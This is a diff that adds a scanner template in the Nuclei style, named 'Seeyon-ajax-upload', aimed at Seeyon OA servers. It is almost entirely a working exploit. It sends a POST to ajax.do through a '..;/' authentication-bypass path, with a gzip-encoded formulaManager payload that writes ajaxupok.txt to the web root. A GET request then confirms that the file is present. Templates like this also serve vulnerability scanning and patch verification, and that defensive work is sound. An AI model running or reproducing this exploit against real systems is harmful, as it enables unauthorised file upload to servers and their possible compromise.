@@ -1,0 +1,28 @@
+id: Seeyon-ajax-upload
+
+info:
+  name: Seeyon-ajax-upload
+  author: wintrysec
+  severity: critical
+  description: 致远Seeyon-ajax-upload.
+  reference: https://github.com
+  tags: seeyon
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AmQ%C3%8DK%C3%830%14%C2%BF%0B%C3%BE%0F%C2%A1%C2%97%C2%B4l%C2%A6%3Ad%C2%88c%07%C2%87%13O%22l%3AD%3Cd%C3%AD%C2%AB%C3%8Dl%C2%93%C2%90%C2%A46%C2%A3%C3%AC%7F_%C2%B2vnHsy%1F%C3%B9%7D%C2%BC%C3%87%C3%BBlp%26TY%15t%C2%B9%C2%95%C2%80%C3%AF%C3%91%C3%8D%10%1D%3B%2F%C2%B4%C3%B4%1Dl%40%1B%7Cj%C3%8F%C2%ADT%C2%A05%13%C3%9C%7F.%C2%8Cb%C3%BC%1BIjr4E%01%21q%0Dk%2A%C2%A5%C2%8E5%C3%80V%C3%B08%C2%98%5C%5E+%C3%B76%C3%B4%C2%97%12%26%C3%88%C2%AB%C3%83%C2%9B%C2%95b%06%14%C2%92%C2%A7%7C%C3%A4%C3%98%1C%C3%AA%3EX%C3%A8%C3%85%07%01%C3%9DP%5BI%C3%B1C%C2%8C5A%C3%94%C2%A9v%C3%B6%3A%C2%BF.%0A%C3%AF%C3%BF%C2%B1%C2%929%3C%C2%BF%C3%97%C3%AB%C2%91%C2%9E%1E%C2%9Du%C3%85I%C3%89tBf%0F%C2%8B%C3%B9%C3%B8%C3%B6%11%12%C2%91%3A%C3%B3%C2%B4%C2%8B%C2%ADo%3F%28%C3%BC%C3%A7%C3%93r%C2%BA%C2%A2%25%C2%B6E%C3%98%C2%A9%C2%916%C3%8E%C2%AA%2Cs%C3%AC%C3%83X%C3%910x%5B%3E%5D%C3%9D%C3%BD%C3%8D%7C%C2%BE59%14%05%0F%C3%8F%C2%95%7B%C2%81I%214%C2%B8yv%13%7F%0F%C2%97%C2%A4%C2%90%21m%C2%A8a%09%C2%B2%C3%96%C2%86Q%C2%83w%C3%AEH%C3%AEP%C2%8D%C2%8FFU%C2%80%C2%BF%C3%B6%10%C2%A7%C3%A3%C2%90%C3%9F%01%00%00'
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/ajaxupok.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ajaxupok"
